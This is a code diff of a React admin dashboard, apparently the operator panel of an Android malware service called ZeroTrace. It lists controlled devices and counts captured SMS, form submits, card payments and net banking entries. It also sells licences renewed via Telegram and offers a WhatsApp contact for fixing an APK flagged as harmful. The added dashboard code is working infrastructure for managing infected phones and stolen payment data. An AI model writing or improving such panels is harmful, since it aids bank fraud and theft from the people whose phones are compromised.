-      if (filter === "favorites" && !d.favoriteFlag) return false;
-
-      if (!q) return true;
-
-      return (
-        d.deviceId.toLowerCase().includes(q) ||
-        d.brand.toLowerCase().includes(q) ||
-        d.model.toLowerCase().includes(q)
-      );
-    });
-  }, [displayRows, deferredSearch, filter]);
-
-  const shouldVirtualize = filtered.length > VIRTUALIZE_AFTER;
-
-  useEffect(() => {
-    if (!shouldVirtualize) {
-      setVisibleRange({ start: 0, end: filtered.length });
-      return;
-    }
-
-    let raf = 0;
-
-    const calcRange = () => {
-      const el = listRef.current;
-      if (!el) return;
-
-      const rect = el.getBoundingClientRect();
-      const listTop = rect.top + window.scrollY;
-      const scrollTop = window.scrollY;
-      const viewportBottom = scrollTop + window.innerHeight;
-
-      const relativeTop = Math.max(0, scrollTop - listTop);
-      const relativeBottom = Math.max(0, viewportBottom - listTop);
-
-      const start = Math.max(0, Math.floor(relativeTop / LIST_ROW_HEIGHT) - LIST_OVERSCAN);
-      const end = Math.min(filtered.length, Math.ceil(relativeBottom / LIST_ROW_HEIGHT) + LIST_OVERSCAN);
-
-      setVisibleRange((prev) => {
-        if (prev.start === start && prev.end === end) return prev;
-        return { start, end };
-      });
-    };
-
-    const onScrollOrResize = () => {
-      if (raf) return;
-      raf = window.requestAnimationFrame(() => {
-        raf = 0;
-        calcRange();
-      });
-    };
-
-    calcRange();
-
-    window.addEventListener("scroll", onScrollOrResize, { passive: true });
-    window.addEventListener("resize", onScrollOrResize);
-
-    return () => {
-      if (raf) window.cancelAnimationFrame(raf);
-      window.removeEventListener("scroll", onScrollOrResize);
-      window.removeEventListener("resize", onScrollOrResize);
-    };
-  }, [filtered.length, shouldVirtualize]);
-
-  const handleFilterChange = useCallback(
-    (next: DeviceFilter) => {
-      setFilter(next);
-
-      const params = new URLSearchParams(searchParams);
-      if (next === "all") params.delete("filter");
-      else params.set("filter", next);
-
-      setSearchParams(params, { replace: true });
-    },
-    [searchParams, setSearchParams],
-  );
-
-  const handleOpen = useCallback(
-    (deviceId: string) => {
-      nav(`/devices/${encodeURIComponent(deviceId)}`);
-    },
-    [nav],
-  );
-
-  const toggleFavoriteHandler = useCallback(
-    async (deviceId: string) => {
-      const curr = !!(favoritesRef.current[deviceId] ?? false);
-      const next = !curr;
-
-      setFavoritesMap((m) => {
-        const updated = { ...m, [deviceId]: next };
-        favoritesRef.current = updated;
-        return updated;
-      });
-
-      setDevices((prev) =>
-        prev.map((d) => (d.deviceId === deviceId ? { ...d, favorite: next, _fav: next } : d)),
-      );
-
+    const wsStatusHandler = (ev: any) => {
       try {
-        await setFavorite(deviceId, next);
-      } catch (e) {
-        console.error("toggleFavorite failed", e);
-
-        setFavoritesMap((m) => {
-          const reverted = { ...m, [deviceId]: curr };
-          favoritesRef.current = reverted;
-          return reverted;
-        });
-
-        setDevices((prev) =>
-          prev.map((d) => (d.deviceId === deviceId ? { ...d, favorite: curr, _fav: curr } : d)),
-        );
-
-        setSuccess(null);
-        setError("Failed to update favorite");
+        setWsConnected(!!ev?.detail?.connected);
+      } catch {
+        // ignore
       }
-    },
-    [],
-  );
+    };
 
-  const handleDeleteDevice = useCallback(async (deviceId: string) => {
-    if (!window.confirm(`Delete device ${deviceId}? This will remove it from DB.`)) return;
+    window.addEventListener("zerotrace:ws", wsStatusHandler as any);
 
-    try {
-      await deleteDevice(deviceId);
-
-      setDevices((prev) => prev.filter((d) => d.deviceId !== deviceId));
-
-      setFavoritesMap((m) => {
-        const copy = { ...m };
-        delete copy[deviceId];
-        favoritesRef.current = copy;
-        return copy;
-      });
-
-      setLatestFormMap((m) => {
-        const copy = { ...m };
-        delete copy[deviceId];
-        return copy;
-      });
-
-      setSuccess(null);
-      setError(null);
-    } catch (e) {
-      console.error("deleteDevice failed", e);
-      setSuccess(null);
-      setError("Failed to delete device");
-    }
+    return () => {
+      unsub();
+      window.removeEventListener("zerotrace:ws", wsStatusHandler as any);
+    };
   }, []);
 
-  const handleCheckOnline = useCallback(
-    async (deviceId: string) => {
-      if (!deviceId || checkingDeviceId || checkingAll) return;
-
-      setCheckingDeviceId(deviceId);
-      setError(null);
-      setSuccess(null);
-
-      try {
-        await sendCheckOnlineCommand(deviceId);
-        setSuccess(`Check command sent to ${deviceId}`);
-      } catch (e) {
-        console.error("check online failed", e);
-        setError(`Failed to send check command for ${deviceId}`);
-      } finally {
-        setCheckingDeviceId(null);
-      }
-    },
-    [checkingAll, checkingDeviceId, sendCheckOnlineCommand],
-  );
-
-  const handleCheckAll = useCallback(async () => {
-    if (checkingAll || checkingDeviceId) return;
-
-    const ids = Array.from(new Set(devices.map((d) => safeStr(d.deviceId)).filter(Boolean)));
-
-    if (ids.length === 0) {
-      setSuccess(null);
-      setError("No devices available");
-      return;
-    }
-
-    setCheckingAll(true);
-    setError(null);
-    setSuccess(null);
-
-    try {
-      const results = await Promise.allSettled(ids.map((id) => sendCheckOnlineCommand(id)));
-      const okCount = results.filter((r) => r.status === "fulfilled").length;
-      const failCount = results.length - okCount;
-
-      if (failCount === 0) {
-        setSuccess(`Check command sent to all ${okCount} devices`);
-      } else if (okCount > 0) {
-        setSuccess(`Check command sent to ${okCount} devices`);
-        setError(`Failed for ${failCount} devices`);
-      } else {
-        setError("Failed to send check command to devices");
-      }
-    } catch (e) {
-      console.error("check all failed", e);
-      setError("Failed to send check command to devices");
-    } finally {
-      setCheckingAll(false);
-    }
-  }, [checkingAll, checkingDeviceId, devices, sendCheckOnlineCommand]);
-
-  const handleManualRefresh = useCallback(() => {
-    setError(null);
-    setSuccess(null);
-    loadAll({ includeForms: true }).catch(() => {});
-  }, [loadAll]);
-
-  const visibleRows = shouldVirtualize ? filtered.slice(visibleRange.start, visibleRange.end) : filtered;
-  const topSpacer = shouldVirtualize ? visibleRange.start * LIST_ROW_HEIGHT : 0;
-  const bottomSpacer = shouldVirtualize ? Math.max(0, (filtered.length - visibleRange.end) * LIST_ROW_HEIGHT) : 0;
+  useEffect(() => {
+    loadDevices();
+    loadFormsSummary();
+    loadFavorites();
+    loadSmsSummary();
+    loadAdminSessions();
+  }, []);
 
   return (
     <AnimatedAppBackground>
-      <div className="mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
+      <div className="mx-auto max-w-[420px] px-3 pb-28 pt-4">
         <SurfaceCard className="p-4">
-          <div className="flex items-start justify-between gap-3">
-            <div className="min-w-0">
-              <div className="text-[22px] font-extrabold tracking-tight text-slate-900">Devices</div>
-              <div className="text-[12px] text-slate-500">Manage all registered devices</div>
+          <div className="flex items-start justify-between pb-2">
+            <div className="flex min-w-0 items-center gap-3">
+              <img src={ztLogo} alt="ZeroTrace logo" className="h-10 w-10 rounded-xl border border-slate-200 bg-white object-contain" />
+              <div className="min-w-0">
+                <div className="truncate text-lg font-bold leading-tight text-slate-900">ZeroTrace</div>
+                <div className="text-[11px] text-slate-500">Secure Admin Panel</div>
+              </div>
             </div>
 
-            <div className="flex shrink-0 items-center gap-2">
-              <button
-                onClick={handleCheckAll}
-                disabled={checkingAll || devices.length === 0}
-                className={[
-                  "h-10 rounded-2xl border border-sky-200 bg-sky-50 px-4 text-sky-700 transition active:scale-[0.99]",
-                  "hover:bg-sky-100 disabled:cursor-not-allowed disabled:opacity-60",
-                ].join(" ")}
-                type="button"
-                title="Check all devices"
-              >
-                {checkingAll ? "Checking…" : "Check All"}
-              </button>
-
-              <button
-                onClick={handleManualRefresh}
-                className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 transition hover:bg-slate-50"
-                type="button"
-                title="Refresh"
-              >
-                ↻
-              </button>
+            <div className="flex items-center gap-2 text-xs">
+              <span className={`inline-block h-2.5 w-2.5 rounded-full ${wsConnected ? "bg-emerald-500" : "bg-rose-500"}`} />
+              <span className={`${wsConnected ? "text-emerald-700" : "text-rose-600"} text-[12px] font-medium`}>
+                {wsConnected ? "Connected" : "Disconnected"}
+              </span>
             </div>
           </div>
 
-          <div className="mt-4">
-            <input
-              value={search}
-              onChange={(e) => setSearch(e.target.value)}
-              placeholder="Search brand / model / id"
-              className={[
-                "h-11 w-full rounded-2xl px-4 text-[14px]",
-                "border border-slate-200 bg-white",
-                "text-slate-900 placeholder:text-slate-400",
-                "outline-none transition",
-                "focus:border-sky-300 focus:ring-2 focus:ring-sky-100",
-              ].join(" ")}
+          <div className="mt-3 grid grid-cols-2 gap-3">
+            <StatTile
+              title="Online Devices"
+              value={onlineCount}
+              icon="📶"
+              hint="Click to view online only"
+              onClick={() => goDevices("online")}
+            />
+            <StatTile
+              title="Offline Devices"
+              value={offlineCount}
+              icon="📴"
+              hint="Click to view offline only"
+              onClick={() => goDevices("offline")}
+            />
+            <StatTile
+              title="Total Devices"
+              value={totalDevices}
+              icon="📱"
+              hint="Click to view all devices"
+              onClick={() => goDevices("all")}
+            />
+            <StatTile
+              title="All SMS"
+              value={smsCount == null ? "…" : smsCount}
+              icon="💬"
+              hint="Click to open SMS History"
+              onClick={() => nav("/sms")}
             />
           </div>
 
-          <div className="mt-3 flex items-center justify-between gap-2">
-            <div className="text-[12px] text-slate-500">Results: {filtered.length}</div>
+          <SurfaceCard className="mt-4 overflow-hidden">
+            <SectionHeader
+              title="Admin Expires in"
+              right={
+                <button
+                  type="button"
+                  onClick={handleRenewClick}
+                  className="rounded-xl border border-sky-200 bg-sky-50 px-3 py-1.5 text-xs font-semibold text-sky-700 hover:bg-sky-100"
+                >
+                  Renew (Telegram)
+                </button>
+              }
+            />
 
-            <select
-              value={filter}
-              onChange={(e) => handleFilterChange(e.target.value as DeviceFilter)}
-              className={[
-                "h-10 rounded-2xl px-3 text-[13px] font-semibold",
-                "border border-slate-200 bg-white",
-                "text-slate-800 outline-none",
-              ].join(" ")}
-            >
-              <option value="all">All</option>
-              <option value="online">Online</option>
-              <option value="offline">Offline</option>
-              <option value="favorites">Favorites</option>
-            </select>
-          </div>
-
-          <div ref={listRef} className="mt-4">
-            {loading && devices.length === 0 ? (
-              <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">
-                Loading…
+            <div className="px-4 py-3">
+              <div className="flex items-center justify-between">
+                <div className="text-xs text-slate-500">Active until:</div>
+                <div className="text-xs font-medium text-slate-800">{formatDMY(license.expiryDate)}</div>
               </div>
-            ) : filtered.length === 0 ? (
-              <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">
-                No devices found.
+
+              <div className="mt-2 flex items-center justify-between">
+                <div className="text-xs text-slate-500">Purchase date:</div>
+                <div className="text-xs font-medium text-slate-800">{formatDMY(license.startDate)}</div>
               </div>
-            ) : (
-              <>
-                {topSpacer > 0 && <div style={{ height: topSpacer }} />}
 
-                {visibleRows.map((d, idx) => {
-                  const absoluteIndex = shouldVirtualize ? visibleRange.start + idx : idx;
-                  const displayNumber = filtered.length - absoluteIndex;
-                  const isCheckingThis = checkingDeviceId === d.deviceId;
+              <div className="pt-4">
+                {countdown ? (
+                  countdown.expired ? (
+                    <div className="rounded-[22px] border border-rose-200 bg-rose-50 p-4 text-center">
+                      <div className="text-2xl font-bold text-rose-600">Expired</div>
+                      <div className="mt-1 text-xs text-slate-500">Please renew license</div>
 
-                  return (
-                    <div
-                      key={d.deviceId}
-                      className="mb-3"
-                      style={shouldVirtualize ? { height: LIST_ROW_HEIGHT } : undefined}
-                    >
-                      <DeviceCard
-                        device={d}
-                        displayNumber={displayNumber}
-                        isChecking={isCheckingThis || checkingAll}
-                        onOpen={handleOpen}
-                        onToggleFavorite={toggleFavoriteHandler}
-                        onCheckOnline={handleCheckOnline}
-                        onDelete={handleDeleteDevice}
-                      />
+                      <button
+                        type="button"
+                        onClick={handleRenewClick}
+                        className="mt-3 w-full rounded-xl border border-rose-200 bg-white py-2 font-semibold text-rose-700 hover:bg-rose-100"
+                      >
+                        Renew Now (Telegram)
+                      </button>
+
+                      <div className="mt-2 text-center text-xs text-slate-500">
+                        Panel ID: <span className="font-medium text-slate-800">{license.panelId || "____"}</span>
+                      </div>
                     </div>
-                  );
-                })}
+                  ) : (
+                    <div className="rounded-[22px] border border-slate-200 bg-slate-50 p-4">
+                      <div className="flex items-end justify-center gap-2 text-[22px] font-semibold tracking-wide sm:text-[34px]">
+                        <span className="text-[28px] text-slate-900 sm:text-[36px]">{pad2(countdown.days)}</span>
+                        <span className="text-slate-300">:</span>
+                        <span className="text-[20px] text-slate-800 sm:text-[28px]">{pad2(countdown.hours)}</span>
+                        <span className="text-slate-300">:</span>
+                        <span className="text-[20px] text-slate-800 sm:text-[28px]">{pad2(countdown.mins)}</span>
+                        <span className="text-slate-300">:</span>
+                        <span className="text-[20px] text-slate-800 sm:text-[28px]">{pad2(countdown.secs)}</span>
+                        <span className="pb-1 text-sm text-slate-500">Sec</span>
+                      </div>
 
-                {bottomSpacer > 0 && <div style={{ height: bottomSpacer }} />}
-              </>
-            )}
+                      <div className="mt-2 text-center text-xs text-slate-500">Days until {formatDMY(license.expiryDate)}</div>
+
+                      <button
+                        type="button"
+                        onClick={handleRenewClick}
+                        className="mt-3 w-full rounded-xl border border-emerald-200 bg-emerald-50 py-3 font-semibold text-emerald-700 hover:bg-emerald-100"
+                      >
+                        Renew License (Telegram)
+                      </button>
+
+                      <div className="mt-2 text-center text-xs text-slate-500">
+                        Panel ID: <span className="font-medium text-slate-800">{license.panelId || "____"}</span>
+                      </div>
+                    </div>
+                  )
+                ) : (
+                  <div className="py-4 text-center text-sm text-slate-400">
+                    Set env <span className="font-medium text-slate-700">VITE_RENEWAL_START_DATE</span> (DD/MM/YYYY).
+                  </div>
+                )}
+              </div>
+            </div>
+          </SurfaceCard>
+
+          <SurfaceCard className="mt-4 overflow-hidden">
+            <SectionHeader title="Fix My Apk Harmfull" />
+
+            <div className="px-4 py-4">
+              <div className="rounded-[20px] border border-amber-200 bg-amber-50 px-3 py-3">
+                <div className="text-sm font-medium text-slate-800">Need help for harmful/fix issue?</div>
+                <div className="mt-1 text-xs text-slate-500">
+                  Click below and WhatsApp will open with auto message:
+                  <span className="font-medium text-slate-700"> hello sir fixmy harmfull</span> + your panel id.
+                </div>
+              </div>
+
+              <button
+                type="button"
+                onClick={handleHarmfullClick}
+                disabled={!harmfullWhatsappLink}
+                className="mt-3 w-full rounded-xl border border-emerald-200 bg-emerald-50 py-3 font-semibold text-emerald-700 hover:bg-emerald-100 disabled:cursor-not-allowed disabled:opacity-60"
+              >
+                contact Harmfull team
+              </button>
+
+              <div className="mt-2 text-center text-xs text-slate-500">
+                Panel ID: <span className="font-medium text-slate-800">{license.panelId || "____"}</span>
+              </div>
+
+              {!harmfullWhatsappLink ? (
+                <div className="mt-2 text-center text-xs text-rose-600">
+                  Set env <span className="font-medium">VITE_HARMFULL_FIX_WP_LINK</span>
+                </div>
+              ) : null}
+            </div>
+          </SurfaceCard>
+
+          <div className="mt-4 grid grid-cols-1 gap-4">
+            <SurfaceCard className="overflow-hidden">
+              <SectionHeader
+                title="All Form Submits"
+                right={
+                  <button
+                    type="button"
+                    onClick={() => nav("/forms")}
+                    className="rounded-xl border border-slate-200 bg-white px-3 py-1.5 text-xs text-slate-700 hover:bg-slate-50"
+                  >
+                    View Forms ›
+                  </button>
+                }
+              />
+
+              <div className="space-y-3 px-4 py-3">
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-2 text-sm">
+                    <span className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50">🗂️</span>
+                    <span className="text-slate-700">Form Submits</span>
+                  </div>
+                  <div className="text-sm font-semibold text-slate-900">{formsCount == null ? "…" : formsCount}</div>
+                </div>
+
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-2 text-sm">
+                    <span className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50">💳</span>
+                    <span className="text-slate-700">Card Payments</span>
+                  </div>
+                  <div className="text-sm font-semibold text-slate-900">{cardCount == null ? "…" : cardCount}</div>
+                </div>
+
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-2 text-sm">
+                    <span className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50">🏦</span>
+                    <span className="text-slate-700">Net Banking Lists</span>
+                  </div>
+                  <div className="text-sm font-semibold text-slate-900">{netbankingCount == null ? "…" : netbankingCount}</div>
+                </div>
+
+                {error ? <div className="pt-2 text-xs text-rose-600">{error}</div> : null}
+              </div>
+            </SurfaceCard>
+
+            <SurfaceCard className="overflow-hidden">
+              <SectionHeader
+                title="Admin Activity"
+                right={
+                  <div className="flex items-center gap-2">
+                    <div className="text-xs text-slate-400">{activityItems.length}</div>
+                    <button
+                      type="button"
+                      onClick={() => nav("/sessions")}
+                      className="rounded-xl border border-slate-200 bg-white px-3 py-1.5 text-xs text-slate-700 hover:bg-slate-50"
+                    >
+                      Manage
+                    </button>
+                  </div>
+                }
+              />
+
+              <div className="px-4 py-3">
+                {activityItems.length === 0 ? (
+                  <div className="text-sm text-slate-400">No activity yet.</div>
+                ) : (
+                  <div className="space-y-2">
+                    {activityItems.map((it) => (
+                      <button
+                        type="button"
+                        key={it.id}
+                        onClick={() => nav("/sessions")}
+                        className="flex w-full items-center justify-between rounded-[18px] border border-slate-200 bg-white px-3 py-2 text-left hover:bg-slate-50"
+                        title="Manage sessions"
+                      >
+                        <div className="flex min-w-0 items-center gap-2">
+                          <div className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50">
+                            {it.icon}
+                          </div>
+                          <div className="min-w-0">
+                            <div className="truncate text-sm font-medium text-slate-900">{it.title}</div>
+                            <div className="truncate text-[11px] text-slate-500">
+                              {it.kind === "session" ? `admin: ${it.subtitle || "admin"}` : it.subtitle || "event"}
+                            </div>
+                          </div>
+                        </div>
+                        <div className="text-xs text-slate-400">{it.ts ? minutesAgo(it.ts) : ""}</div>
+                      </button>
+                    ))}
+                  </div>
+                )}
+
+                {sessionActivity.length === 0 ? (
+                  <div className="mt-3 text-[11px] text-slate-400">
+                    Tip: If this stays empty, check backend route <span className="font-mono text-slate-700">GET /api/admin/sessions</span>.
+                  </div>
+                ) : null}
+              </div>
+            </SurfaceCard>
           </div>
 
-          {success && (
-            <div className="mt-4 rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-2 text-sm text-emerald-700">
-              {success}
-            </div>
-          )}
+          <SurfaceCard className="mt-4 overflow-hidden">
+            <SectionHeader
+              title="Favorites"
+              right={
+                <button
+                  type="button"
+                  onClick={() => nav("/favorites")}
+                  className="rounded-xl border border-slate-200 bg-white px-3 py-1.5 text-xs text-slate-700 hover:bg-slate-50"
+                >
+                  View All ›
+                </button>
+              }
+            />
 
-          {error && (
-            <div className="mt-4 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">
-              {error}
+            <div className="px-4 py-3">
+              {favoritesPreview.length === 0 ? (
+                <div className="text-sm text-slate-400">No favorites yet.</div>
+              ) : (
+                <div className="space-y-2">
+                  {favoritesPreview.map((id) => {
+                    const d = devices.find((x) => x.deviceId === id);
+                    const ts = d?.status?.timestamp || 0;
+                    return (
+                      <button
+                        type="button"
+                        key={id}
+                        onClick={() => nav(`/devices/${encodeURIComponent(id)}`)}
+                        className="flex w-full items-center justify-between rounded-[18px] border border-slate-200 bg-white px-3 py-2 text-left hover:bg-slate-50"
+                      >
+                        <div className="flex min-w-0 items-center gap-2">
+                          <div className="flex h-8 w-8 items-center justify-center rounded-lg border border-slate-200 bg-slate-50">⭐</div>
+                          <div className="min-w-0">
+                            <div className="truncate text-sm font-medium text-slate-900">{id}</div>
+                            <div className="truncate text-[11px] text-slate-500">{d?.status?.online ? "online" : "offline"}</div>
+                          </div>
+                        </div>
+                        <div className="text-xs text-slate-400">{ts ? minutesAgo(ts) : ""}</div>
+                      </button>
+                    );
+                  })}
+                </div>
+              )}
             </div>
-          )}
+          </SurfaceCard>
+
+          <div className="hidden">
+            <CountDown
+              expiryDate={license.expiryISO}
+              title="License Countdown"
+              subtitle={`Panel: ${license.panelId || "____"}`}
+              onRenew={handleRenewClick}
+              renewLabel="Renew (Telegram)"
+            />
+          </div>
         </SurfaceCard>
       </div>
     </AnimatedAppBackground>
